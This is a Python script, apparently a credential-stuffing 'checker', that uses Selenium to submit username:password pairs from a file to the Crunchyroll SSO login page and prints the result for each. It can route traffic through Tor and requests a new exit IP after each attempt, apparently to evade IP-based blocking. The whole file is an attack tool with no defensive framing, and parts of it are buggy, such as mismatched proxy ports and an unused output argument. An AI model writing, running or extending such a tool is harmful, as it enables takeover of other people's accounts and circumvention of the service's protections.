import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as expected
from stem import Signal
from stem.control import Controller
import time

# driver = webdriver.Firefox(options='-headless')

def get_tor() -> Proxy:
    proxy: Proxy = Proxy()
    proxy.proxy_type: ProxyType = ProxyType.MANUAL
    proxy.http_proxy: str = "socks5://localhost:9150"
    return proxy

def get_new_ip() -> None:
    with Controller.from_port(port=9050) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)

def handle_creds(creds_path:str) -> map:
    with open(creds_path, 'r') as file:
        creds: list[str] = file.readlines()
        cred_map: map[str] = {}

        for cred in creds:
            cred_split = cred.split(sep=':')
            cred_map[cred_split[0]] = cred_split[1]

    return cred_map

def main(creds:str, out:str, tor:bool):
    opts: FirefoxOptions = []

    if tor:
        get_tor()

        opts = webdriver.FirefoxOptions()
        opts.set_preference("network.proxy.type", 1)
        opts.set_preference("network.proxy.socks", "127.0.0.1")
        opts.set_preference("network.proxy.socks_port", 9050)

    driver: Firefox = webdriver.Firefox(options=opts)
    
    try:
        driver.get('https://sso.crunchyroll.com/login')

        creds: map[str] = handle_creds(creds)

        for usr, pwd in creds.items():
            email_input = driver.find_element(by=By.XPATH, value='//*[@id="email_input"]')
            password_input = driver.find_element(by=By.XPATH, value='//*[@id="password_input"]')
            submit_button = driver.find_element(by=By.XPATH, value='//*[@id="submit_button"]')
            
            email_input.send_keys(usr)
            password_input.send_keys(pwd)
            submit_button.click()

            time.sleep(3)
        
            result = WebDriverWait(driver, 10).until(
                expected.presence_of_element_located((By.CLASS_NAME, 'cx-flash-message__error'))
            )

            if result != '':
                print(result.text)
            else: pass
            # if result == ''

            if tor: get_new_ip()

        time.sleep(2)
    finally:
        driver.quit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('creds', type=str, help='Insert the file path to the credentials to test in the \x1B[1;3musername:password\x1B[0m format')
    parser.add_argument('-o', metavar='/path/to/file', type=str, default='./', help='Where do you want to save the output file')
    parser.add_argument('-t', action='store_true', help='Use that if you want to use the checker over tor network')

    args: argparse.Namespace = parser.parse_args()

    try:
        main(args.creds, args.o, args.t)
    except argparse.ArgumentTypeError as e:
        print('Invalid arguments: ' + e)